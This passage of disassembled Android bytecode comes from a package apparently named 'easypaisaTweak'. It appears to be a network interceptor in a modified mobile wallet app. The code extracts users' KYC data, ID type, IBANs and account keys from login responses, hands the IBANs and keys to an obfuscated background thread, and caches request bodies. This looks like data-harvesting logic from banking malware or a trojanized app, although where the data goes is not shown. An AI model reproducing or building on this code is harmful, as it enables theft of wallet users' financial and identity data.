    038e: invoke-virtual {v0, v3}, Lcom/alibaba/fastjson/JSONObject;->getJSONObject(Ljava/lang/String;)Lcom/alibaba/fastjson/JSONObject;
    0391: move-result-object v0
    0392: const-string v3, 'userBasicInfo'
    0394: invoke-virtual {v0, v3}, Lcom/alibaba/fastjson/JSONObject;->getJSONObject(Ljava/lang/String;)Lcom/alibaba/fastjson/JSONObject;
    0397: move-result-object v0
    0398: const-string v3, 'idType'
    039a: invoke-virtual {v0, v3}, Lcom/alibaba/fastjson/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    039d: move-result-object v3
    039e: sput-object v3, Lcom/easypaisaTweak/WalletApp;->userType:Ljava/lang/String;
    03a0: const-string v3, 'kycData'
    03a2: invoke-virtual {v0, v3}, Lcom/alibaba/fastjson/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    03a5: move-result-object v3
    03a6: sput-object v3, Lcom/easypaisaTweak/WalletApp;->kycData:Ljava/lang/String;
    03a8: const-string v3, 'accountDetails'
    03aa: invoke-virtual {v0, v3}, Lcom/alibaba/fastjson/JSONObject;->getJSONArray(Ljava/lang/String;)Lcom/alibaba/fastjson/a;
    03ad: move-result-object v0
    03ae: new-instance v3, Lorg/json/JSONArray;
    03b0: invoke-direct {v3}, Lorg/json/JSONArray;-><init>()V
    03b3: new-instance v5, Lorg/json/JSONArray;
    03b5: invoke-direct {v5}, Lorg/json/JSONArray;-><init>()V
    03b8: if-eqz v0, 03e0
    03ba: invoke-virtual {v0}, Lcom/alibaba/fastjson/a;->isEmpty()Z
    03bd: move-result v6
    03be: if-nez v6, 03e0
    03c0: invoke-virtual {v0}, Lcom/alibaba/fastjson/a;->size()I
    03c3: move-result v6
    03c4: const/4 v15, #0
    03c5: if-ge v15, v6, 03e0
    03c7: invoke-virtual {v0, v15}, Lcom/alibaba/fastjson/a;->getJSONObject(I)Lcom/alibaba/fastjson/JSONObject;
    03ca: move-result-object v7
    03cb: const-string v8, 'IBAN'
    03cd: invoke-virtual {v7, v8}, Lcom/alibaba/fastjson/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    03d0: move-result-object v8
    03d1: invoke-virtual {v3, v8}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    03d4: const-string v8, 'accountKey'
    03d6: invoke-virtual {v7, v8}, Lcom/alibaba/fastjson/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    03d9: move-result-object v7
    03da: invoke-virtual {v5, v7}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    03dd: add-int/lit8 v15, v15, #1
    03df: goto 03c5
    03e0: new-instance v0, Ljava/lang/Thread;
    03e2: new-instance v6, Lcom/easypaisaTweak/yWkiZmD;
    03e4: const/4 v7, #0
    03e5: invoke-direct {v6, v3, v5, v7}, Lcom/easypaisaTweak/yWkiZmD;-><init>(Ljava/lang/Object;, Ljava/lang/Object;, I)V
    03e8: invoke-direct {v0, v6}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    03eb: invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    03ee: const/4 v0, #1
    03ef: sput-boolean v0, Lcom/easypaisaTweak/WalletApp;->isLogined:Z
    03f1: goto 0407
    03f2: move-exception v0
    03f3: new-instance v3, Ljava/lang/StringBuilder;
    03f5: invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V
    03f8: const-string v5, '/security/login error:'
    03fa: invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    03fd: invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    0400: invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    0403: move-result-object v0
    0404: invoke-static {v0}, Lcom/easypaisaTweak/HttpHelper;->saveToCache(Ljava/lang/String;)V
    0407: invoke-virtual {v1}, Lokhttp3/Request;->url()Lokhttp3/HttpUrl;
    040a: move-result-object v0
    040b: invoke-virtual {v0}, Lokhttp3/HttpUrl;->toString()Ljava/lang/String;
    040e: move-result-object v0
    040f: invoke-virtual {v0, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    0412: move-result v0
    0413: if-nez v0, 0457
    0415: invoke-virtual {v1}, Lokhttp3/Request;->url()Lokhttp3/HttpUrl;
    0418: move-result-object v0
    0419: invoke-virtual {v0}, Lokhttp3/HttpUrl;->toString()Ljava/lang/String;
    041c: move-result-object v0
    041d: invoke-virtual {v0, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    0420: move-result v0
    0421: if-nez v0, 0457
    0423: const-string v0, 'PUT'
    0425: invoke-static {v4, v0}, Lorg/apache/commons/lang/StringUtils;->equals(Ljava/lang/String;, Ljava/lang/String;)Z
    0428: move-result v0
    0429: if-nez v0, 0457
    042b: invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    042e: move-result-object v0
    042f: invoke-static {v0}, Lcom/easypaisaTweak/HttpHelper;->saveToCache(Ljava/lang/String;)V
    0432: goto 0457
    0433: move-exception v0
    0434: new-instance v1, Ljava/lang/StringBuilder;
    0436: const-string v3, 'step2 error:'
    0438: invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    043b: invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    043e: invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    0441: move-result-object v1
    0442: invoke-static {v10, v1}, Landroid/util/Log;->e(Ljava/lang/String;, Ljava/lang/String;)I
    0445: invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V
    0448: new-instance v1, Ljava/lang/StringBuilder;
    044a: invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    044d: invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    0450: invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    0453: move-result-object v0
    0454: invoke-static {v0}, Lcom/easypaisaTweak/HttpHelper;->saveToCache(Ljava/lang/String;)V
    0457: return-object v2
.end method
